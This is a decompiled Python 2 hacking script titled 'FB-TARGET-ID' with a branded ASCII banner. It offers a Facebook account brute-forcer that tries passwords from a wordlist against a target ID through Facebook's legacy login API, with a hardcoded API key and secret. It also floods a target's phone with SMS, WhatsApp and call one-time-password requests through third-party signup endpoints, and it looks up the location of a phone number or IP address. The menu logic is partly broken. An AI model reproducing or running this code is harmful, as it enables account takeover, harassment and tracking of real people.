
# Decompiled by HTR-TECH | TAHMID RAYAT
# Github : https://github.com/htr-tech
#---------------------------------------
# Source File : FB-TARGET-ID.py
# Time : Sun Feb 14 08:33:57 2021
#---------------------------------------
#!/usr/bin/python
# -*- coding: utf-8

try:
    import os, sys, json, time, mechanize, cookielib, random, requests, hashlib, urllib, subprocess as sp, os, time, sys, requests, random, json
    from urllib import *
    from bs4 import BeautifulSoup as bs
except ImportError:
    print '\x1b[35m[=] \x1b[31mSorry Import Error'

API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
hijau = '\x1b[32m'
cyan = '\x1b[36m'
kuning = '\x1b[33;1m'
ungu = '\x1b[35m'
putih = '\x1b[37m'
biru = '\x1b[34m'
merah = '\x1b[1;91m'
lfa = 0
nom = []
logo =  """		
\033[1;91m█▀▄▀█ █▀▀█ █▀▀ ░▀░ █▀▀█
\033[1;93m█░▀░█ █▄▄█ █▀▀ ▀█▀ █▄▄█
\033[1;92m▀░░░▀ ▀░░▀ ▀░░ ▀▀▀ ▀░░▀
  👌💓💕💕💗💗💗💕💕💓👌
\033[1;97m█░█ ░▀░ █░░ █░░ █▀▀ █▀▀█
\033[1;96m█▀▄ ▀█▀ █░░ █░░ █▀▀ █▄▄▀
\033[1;95m▀░▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀░▀▀
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   MAFIA-KILLER.☕
           💕💕         BE HAPPY 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕
\x1b[1;93m--------------------------------------------------------------
\x1b[1;92m➣ NAME :           💗 FAROOQ ANSARI 💗
\x1b[1;91m➣ CYBER NAME :  💣MAFIA-KILLER 💣
\x1b[1;93m➣ WHATSAPP NO :   👬 +92132197796 👬
\x1b[1;95m➣ WARNING :  👉 DON,T CALL ME ONLY TEXT🔫
\x1b[1;96m➣ FUNNY LINE :  AGEA ME JAWAN HO KE
\x1b[1;97m➣ NOTE :      💕USE 4GB YA 6GB RAM MOBILE💕
\x1b[1;92m➣ NOTE :      👏USE FAST 4G SIM NET👏
\x1b[1;91m➣ NOTE :      🌍 1ST CLEAR TERMUX MEMORY DATA🌍
\x1b[1;95m➣ NOTE : 🔎NO NEED VPN🔎 ( 🌷WITHOUT LOGIN🌷 
\x1b[1;96m➣ COMAND TYPE : 💏  FB TARGET ID  💏
\x1b[1;97m➣ ADVOICE : 💏  CREAT OWN PASSLIST 💏
\x1b[1;93m➣ DISCLAMIAR :  👊DON,T USE  ILLIGAL WAY👊
\x1b[1;93m--------------------------------------------------------------
""" 
menu = ' \x1b[31m[\x1b[32m01] Facebook Hack\n \x1b[31m[\x1b[32m02\x1b[31m]\x1b[37m Info Tools\n \x1b[31m[\x1b[32m00\x1b[31m]\x1b[37m Back Program\n\x1b[31m+------------------------------------------+'

def keluar():
    print '\x1b[31m[=]\x1b[37m Keluar'
    sys.exit()


def main():
    os.system('clear')
    print logo
    print menu
    pilih = raw_input('%s[=] %sSelect Menu%s >>%s ' % (hijau, putih, merah, ungu))
    if pilih == '':
        print '\x1b[31m[\xc3\x97]\x1b[37m Your Choice is target id'
        time.sleep(2)
        main()
    elif pilih == '1' or pilih == '':
        lacaknope()
    elif pilih == '2' or pilih == '':
        lacakip()
    elif pilih == '3' or pilih == '':
        spam()
    elif pilih == '1' or pilih == '01':
        hackfb()
    elif pilih == '3' or pilih == '03':
        info()
    elif pilih == '0' or pilih == '00':
        FINISHED()
    else:
        print '\x1b[31m[\xc3\x97]\x1b[37m Your choice is wrong'
        time.sleep(2)
        hackfb()


def info():
    os.system('clear')
    print logo
    print '    \x1b[37m Author \x1b[31m:\x1b[32m Mr James\n     \x1b[37mGithub \x1b[31m: \x1b[32mhttps:James404-cyber\n     \x1b[37msupport\x1b[31m: \x1b[32mApni.bapka.account7\n\x1b[31m+------------------------------------------+'
    raw_input('\n\n   \x1b[31m[\x1b[37m ENTER TO BACK\x1b[31m ]')
    main()


def lacaknope():
    os.system('clear')
    print logo
    try:
        print '          %s<=[%sEx%s: %s08\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97%s]=>\n' % (merah, kuning, hijau, putih, merah)
        nomor = str(raw_input('\x1b[37m[\x1b[32m=\x1b[37m]\x1b[37m Enter the Target HP Number \x1b[31m:\x1b[32m '))
        if nomor.isalpha():
            print '\x1b[37m[\x1b[31m=\x1b[37m]\x1b[31m Number Not Found'
            sys.exit()
        url = 'http://api.antideo.com/phone/id/{}'
        kk = requests.get
        tus = kk(url.format(nomor))
        print tus
        z = json.loads(tus.text)
        print '\x1b[31m------------------------------------------'
        print '\x1b[32m [\xe2\x9c\x93]\x1b[37m Phone     \x1b[1;91m:\x1b[32m ' + str(z['phone'])
        nom.append(z['phone'])
        print ' [\xe2\x9c\x93]\x1b[37m Valid     \x1b[1;91m:\x1b[32m ' + str(z['valid'])
        print ' [\xe2\x9c\x93]\x1b[37m Type      \x1b[1;91m:\x1b[32m ' + str(z['type'])
        print ' [\xe2\x9c\x93]\x1b[37m Location  \x1b[1;91m:\x1b[32m ' + str(z['location'][:51])
        print ' [\xe2\x9c\x93]\x1b[37m Carrier   \x1b[1;91m:\x1b[32m ' + str(z['carrier'])
        print ' [\xe2\x9c\x93]\x1b[37m Timezones \x1b[1;91m:\x1b[32m ' + str(z['timezones'])
        print ' [\xe2\x9c\x93]\x1b[37m E164      \x1b[1;91m:\x1b[32m ' + str(z['formats']['E164'])
        print ' [\xe2\x9c\x93]\x1b[37m National  \x1b[1;91m:\x1b[32m ' + str(z['formats']['national'])
        print ' [\xe2\x9c\x93]\x1b[37m International \x1b[1;91m:\x1b[32m ' + str(z['formats']['international'])
        print '\x1b[31m------------------------------------------'
        raw_input('\n\x1b[31m[\x1b[37m ENTER TO BACK\x1b[31m ]')
        main()
    except (KeyboardInterrupt, EOFError):
        print '\n%s{%s!%s} %sKeyboard Interrupt\n' % (putih, merah, putih, putih)
        keluar()
    except requests.exceptions.ConnectionError:
        print '%s[%sx%s] %sTidak ada koneksi ' % (putih, merah, putih, putih)
        keluar()


def lacakip():
    os.system('clear')
    print logo
    try:
        ip = str(raw_input('\x1b[37m[\x1b[32m=\x1b[37m]\x1b[37m Enter the Target IP Number \x1b[31m:\x1b[32m '))
        url = 'http://ip-api.com/json/' + ip
        data = urlopen(url).read().decode('utf-8')
        data2 = eval(data)
        print '\x1b[31m------------------------------------------'
        try:
            print '\x1b[0;34m[+]\x1b[1;37m AS           \x1b[0;31m:\x1b[0;32m ', str(data2['as'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'

        try:
            print '\x1b[0;34m[+]\x1b[1;37m COUNTRY      \x1b[0;31m:\x1b[0;32m ', str(data2['country'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'

        try:
            print '\x1b[0;34m[+]\x1b[1;37m CITY         \x1b[0;31m:\x1b[0;32m ', str(data2['city'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'

        try:
            print '\x1b[0;34m[+]\x1b[1;37m COUNTRY CODE \x1b[0;31m:\x1b[0;32m ', str(data2['countryCode'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'

        try:
            print '\x1b[0;34m[+]\x1b[1;37m ISP          \x1b[0;31m:\x1b[0;32m ', str(data2['isp'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'

        try:
            print '\x1b[0;34m[+]\x1b[1;37m LATITUDE     \x1b[0;31m:\x1b[0;32m ', str(data2['lat'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'

        try:
            print '\x1b[0;34m[+]\x1b[1;37m LONGTITUDE   \x1b[0;31m:\x1b[0;32m ', str(data2['lon'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'

        try:
            print '\x1b[0;34m[+]\x1b[1;37m ORG          \x1b[0;31m:\x1b[0;32m ', str(data2['org'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'

        try:
            print '\x1b[0;34m[+]\x1b[1;37m QUERY        \x1b[0;31m:\x1b[0;32m ', str(data2['query'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'

        try:
            print '\x1b[0;34m[+]\x1b[1;37m REGION       \x1b[0;31m:\x1b[0;32m ', str(data2['region'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'

        try:
            print '\x1b[0;34m[+]\x1b[1;37m REGION NAME  \x1b[0;31m:\x1b[0;32m ', str(data2['regionName'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'

        try:
            print '\x1b[0;34m[+]\x1b[1;37m TIME ZONE    \x1b[0;31m:\x1b[0;32m ', str(data2['timezone'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'

        try:
            print '\x1b[0;34m[+]\x1b[1;37m ZIP          \x1b[0;31m:\x1b[0;32m ', str(data2['zip'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'

        try:
            print '\x1b[0;34m[+]\x1b[1;37m MAPS         \x1b[0;31m:\x1b[0;32m  https://www.google.co.id/maps/place/' + str(data2['lat']) + ',' + str(data2['lon'])
        except KeyError:
            print '\x1b[0;34m                    ~> \x1b[31;1munknown'

        try:
            print '\x1b[0;34m[+]\x1b[1;37m STATUS       \x1b[0;31m:\x1b[0;32m ', str(data2['status'])
            print '\x1b[31m------------------------------------------'
            raw_input('\n\x1b[31m[\x1b[37m ENTER TO BACK\x1b[31m ]')
            main()
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1mFailed'

    except (KeyboardInterrupt, EOFError):
        print '\n%s{%s!%s} %sKeyboard Interrupt\n' % (putih, merah, putih, putih)
        keluar()
    except requests.exceptions.ConnectionError:
        print '%s[%sx%s] %sTidak ada koneksi ' % (putih, merah, putih, putih)
        keluar()


def spam():
    os.system('clear')
    print logo
    print ' \x1b[31m[\x1b[32m01\x1b[31m]\x1b[37m Spam Call'
    print ' \x1b[31m[\x1b[32m02\x1b[31m]\x1b[37m Spam Sms'
    print ' \x1b[31m[\x1b[32m03\x1b[31m]\x1b[37m Spam Wa'
    print ' \x1b[31m[\x1b[32m00\x1b[31m]\x1b[37m Back'
    print '\x1b[31m------------------------------------------'
    pilih = raw_input('%s[=] %sSelect Menu%s >>%s ' % (hijau, putih, merah, ungu))
    if pilih == '':
        print '\x1b[31m[\xc3\x97]\x1b[37m Your choice is wrong'
        time.sleep(2)
        spam()
    elif pilih == '1' or pilih == '01':
        call()
    elif pilih == '2' or pilih == '02':
        sms()
    elif pilih == '3' or pilih == '03':
        wa()
    elif pilih == '0' or pilih == '00':
        main()
    else:
        print '\x1b[31m[\xc3\x97]\x1b[37m Your choice is wrong'
        time.sleep(2)
        hackfb()


def wa():
    os.system('clear')
    print logo
    print '          %s<=[%sEx%s: %s628\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97%s]=>\n' % (merah, kuning, hijau, putih, merah)
    no = raw_input('\x1b[37m[\x1b[32m=\x1b[37m]\x1b[37m Enter the Target HP Number \x1b[31m:\x1b[32m ')
    if no.isalpha():
        print '\x1b[37m[\x1b[31m=\x1b[37m]\x1b[31m Number Not Found'
        time.sleep(2)
        spam()
    jml = raw_input('\x1b[37m[\x1b[32m=\x1b[37m]\x1b[37m Enter the Spam Amount \x1b[31m:\x1b[32m ')
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'Connection': 'keep-alive', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on', 'user-agent': '{acak}', 'referer': 'https://bos.smartlink.id/register', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.get('https://bos.smartlink.id/getOTPRegister/' + no + '/wa', headers=hd)
            if 'success' in a.text:
                print '%s[%s%s%s] %sSuccess spam %s%s' % (merah, hijau, z, merah, putih, biru, no)
                time.sleep(0.1)
            else:
                print '%s[%s%s%s] %sFailed to spam %s%s' % (merah, hijau, z, merah, putih, biru, no)
                time.sleep(0.1)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sNo connection ' % (putih, merah, putih, putih)
            keluar()

    raw_input('\n\x1b[31m[\x1b[37m ENTER TO BACK\x1b[31m ]')
    spam()


def sms():
    os.system('clear')
    print logo
    print '          %s<=[%sEx%s: %s08\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97%s]=>\n' % (merah, kuning, hijau, putih, merah)
    no = raw_input('\x1b[37m[\x1b[32m=\x1b[37m]\x1b[37m Enter the Target HP Number \x1b[31m:\x1b[32m ')
    if no.isalpha():
        print '\x1b[37m[\x1b[31m=\x1b[37m]\x1b[31m Number Not Found'
        time.sleep(2)
        spam()
    jml = raw_input('\x1b[37m[\x1b[32m=\x1b[37m]\x1b[37m Enter the Spam Amount \x1b[31m:\x1b[32m ')
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'origin': 'https://sobat.indihome.co.id', 'x-requested-with': 'XMLHttpRequest', 'user-agent': '{acak}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://sobat.indihome.co.id/register', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp', headers=hd, data={'type': 'hp', 'msisdn': no})
            if 'Kode verifikasi telah dikirim' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s%s' % (merah, hijau, z, merah, putih, biru, no)
                time.sleep(0.1)
            else:
                print '%s[%s%s%s] %sSuccess spam %s%s' % (merah, hijau, z, merah, putih, biru, no)
                time.sleep(0.1)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sNo connection ' % (putih, merah, putih, putih)
            keluar()

    raw_input('\n\x1b[31m[\x1b[37m ENTER TO BACK\x1b[31m ]')
    spam()


def call():
    os.system('clear')
    print logo
    print '          %s<=[%sEx%s: %s628\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97%s]=>\n' % (merah, kuning, hijau, putih, merah)
    no = raw_input('\x1b[37m[\x1b[32m=\x1b[37m]\x1b[37m Enter the Target HP Number \x1b[31m:\x1b[32m ')
    if no.isalpha():
        print '\x1b[37m[\x1b[31m=\x1b[37m]\x1b[31m Number Not Found'
        time.sleep(2)
        spam()
    jml = raw_input('\x1b[37m[\x1b[32m=\x1b[37m]\x1b[37m Enter the Spam Amount \x1b[31m:\x1b[32m ')
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    r = requests.Session()
    hd = {'content-length': '82', 'origin': 'https://www.airbnb.co.id', 'x-csrf-token': 'V4$.airbnb.co.id$NeEJZxARGJA$r3bBAEtLKJ7cH3yiFNUKlxsckvHI1tHK4uAJADeUn_A=', 'x-csrf-without-token': '1', 'user-agent': '{acak}', 'content-type': 'application/json', 'accept': 'application/json, text/javascript, */*; q=0.01', 'cache-control': 'no-cache', 'x-requested-with': 'XMLHttpRequest', 'referer': 'https://www.airbnb.co.id/signup_login', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id', headers=hd, json={'phoneNumber': no, 'workFlow': 'GLOBAL_SIGNUP_LOGIN', 'otpMethod': 'CALL'})
            if 'true' in a.text:
                print '%s[%s%s%s] %sSuccess spam %s%s' % (merah, hijau, z, merah, putih, biru, no)
                time.sleep(0.1)
            else:
                print '%s[%s%s%s] %sFailed to spam %s%s' % (merah, hijau, z, merah, putih, biru, no)
                time.sleep(0.1)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sNo connection ' % (putih, merah, putih, putih)
            keluar()

    raw_input('\n\x1b[31m[\x1b[37m ENTER TO BACK\x1b[31m ]')
    spam()


def hackfb():
    os.system('clear')
    print logo
    print ' \x1b[31m[\x1b[32m01\x1b[31m]\x1b[37m Target Facebook Hack'
    print ' \x1b[31m[\x1b[32m00\x1b[31m]\x1b[37m Back'
    print '\x1b[31m------------------------------------------'
    pilih = raw_input('%s[=] %sSelect Menu%s >>%s ' % (hijau, putih, merah, ungu))
    if pilih == '':
        print '\x1b[31m[\xc3\x97]\x1b[37m Your choice is wrong'
        time.sleep(2)
        hackfb()
    elif pilih == '1' or pilih == '01':
        hack()
    elif pilih == '2' or pilih == '02':
        print '\x1b[31m[\xc3\x97]\x1b[37m I said Happy Hack Fool'
        time.sleep(2)
        hackfb()
    elif pilih == '0' or pilih == '00':
        main()
    else:
        print '\x1b[31m[\xc3\x97]\x1b[37m ALLWAYS BE HAPPY'
        time.sleep(2)
        hackfb()


def hack():
    try:
    	print '  %s<=[%sExample (link)%s: %s100012345678910%s]=>\n' % (merah, kuning, hijau, putih, merah)
        print '  %s<=[%sExample ( Email)%s: %sMAFIA-KILLER@gmail.com%s]=>\n' % (merah, kuning, hijau, putih, merah)
        print '  %s<=[%sExample (Number)%s: %s03132197796%s]=>\n' % (merah, kuning, hijau, putih, merah)
        
        userid = raw_input('\x1b[32m[*]\x1b[37m Target ID\x1b[31m :\x1b[32m ')
        passlist = raw_input('\x1b[32m[*]\x1b[37m Wordlist ( pass.txt ) \x1b[31m :\x1b[32m ')
        if os.path.exists(passlist) != False:
            print '\x1b[31m------------------------------------------'
            print (' \x1b[32m[+]\x1b[37m Account to crack\x1b[31m :\x1b[32m {}').format(userid)
            print (' \x1b[32m[+]\x1b[37m Total Password \x1b[31m :\x1b[32m {}').format(len(open(passlist, 'r').read().split('\n')))
            print '\x1b[31m------------------------------------------'
            for passwd in open(passlist, 'r').readlines():
                sys.stdout.write((u'\x1b[1000D\x1b[32m[*] \x1b[37mTrying\x1b[32m {}\n').format(passwd.strip()))
                sys.stdout.flush()
                sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={}return_ssl_resources=0v=1.0{}').format(userid, passwd.strip(), API_SECRET)
                xx = hashlib.md5(sig).hexdigest()
                data = ('api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={}&return_ssl_resources=0&v=1.0&sig={}').format(userid, passwd.strip(), xx)
                response = urllib.urlopen(('https://api.facebook.com/restserver.php?{}').format(data)).read()
                if 'error' in response:
                    pass
                else:
                    print ('\n\x1b[32m[+]\x1b[37m Target Password Hack\x1b[31m >>\x1b[32m {}').format(passwd.strip())
                    break

            raw_input('\n\x1b[31m[\x1b[37m ENTER TO BACK\x1b[31m ]')
            main()
        else:
            print '\x1b[31m[\xc3\x97]\x1b[37m Wordlist Not Found'
            time.sleep(2)
            hackfb()
    except KeyboardInterrupt:
        print '\x1b[31m[\x1b[37merror\x1b[31m]=[\x1b[31m Keyboard interrupt'


if __name__ == '__main__':
    main()

